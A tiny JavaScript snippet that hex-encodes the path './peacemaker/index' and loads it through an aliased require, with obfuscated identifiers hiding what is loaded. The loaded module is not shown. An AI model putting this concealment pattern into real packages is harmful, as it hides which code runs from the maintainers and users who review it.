(function(){
  const _0x3f91 = [
    '\x2e\x2f\x70\x65\x61\x63\x65\x6d\x61\x6b\x65\x72\x2f\x69\x6e\x64\x65\x78'
  ];
  const _0x4c6b = function(_0x2b17f0) {
    return _0x3f91[_0x2b17f0];
  };
  const _0xreq = require;
  _0xreq(_0x4c6b(0));
})();
